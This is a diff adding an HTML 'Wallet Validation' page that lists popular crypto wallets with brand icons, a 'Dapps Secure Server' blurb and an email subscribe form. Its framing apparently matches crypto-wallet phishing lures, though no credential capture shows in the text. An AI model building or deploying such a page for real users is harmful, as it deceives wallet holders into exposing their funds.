@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Select a Wallet - Wallet Validation</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="wallets.css">
+</head>
+<body>
+    <header id="header">
+        <div class="container">
+            <div class="logo">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="16" cy="16" r="15" stroke="#0052FF" stroke-width="2" fill="none"/>
+                    <path d="M16 6 L20 12 L16 18 L12 12 Z" fill="#0052FF"/>
+                    <path d="M16 18 L24 24 L20 28 L12 22 Z" fill="#0052FF" opacity="0.6"/>
+                </svg>
+                <span>Wallet Validation</span>
+            </div>
+            <div class="wallet-badge">
+                <span>Validate Wallet</span>
+            </div>
+        </div>
+    </header>
+
+    <section class="wallets-container">
+        <div class="container">
+            <h1>Select a Wallet</h1>
+            <div class="wallets-grid">
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_Coinbase.svg?auto=format&w=64" alt="Coinbase">
+                    <h3>Coinbase</h3>
+                    <p>coinbase.com</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_Ledger.svg?auto=format&w=64" alt="Ledger Live">
+                    <h3>Ledger Live</h3>
+                    <p>ledger.com</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_MetaMask.svg?auto=format&w=64" alt="Metamask">
+                    <h3>Metamask</h3>
+                    <p>metamask.io</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_Electrum.svg?auto=format&w=64" alt="Electrum">
+                    <h3>Electrum</h3>
+                    <p>electrum.org</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_Exodus.svg?auto=format&w=64" alt="Exodus">
+                    <h3>Exodus</h3>
+                    <p>exodus.com</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_Trust.svg?auto=format&w=64" alt="Trust Wallet">
+                    <h3>Trust Wallet</h3>
+                    <p>trustwallet.com</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_Phantom.svg?auto=format&w=64" alt="Phantom">
+                    <h3>Phantom</h3>
+                    <p>phantom.app</p>
+                </div>
+                <div class="wallet-card">
+                    <img src="https://wallet-ui.imgix.net/Icon_WalletConnect.svg?auto=format&w=64" alt="Wallet Connect">
+                    <h3>Wallet Connect</h3>
+                    <p>walletconnect.com</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="subscribe-section">
+        <div class="container">
+            <h2>Decentralized Launchpad</h2>
+            <p>Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two apps and/or devices.</p>
+            <div class="subscribe-form">
+                <h3>Subscribe</h3>
+                <form id="subscribeForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+                    <input type="email" name="email" placeholder="name@email.com" required>
+                    <button type="submit" class="btn-subscribe">Subscribe</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <script src="script.js"></script>
+</body>
+</html>
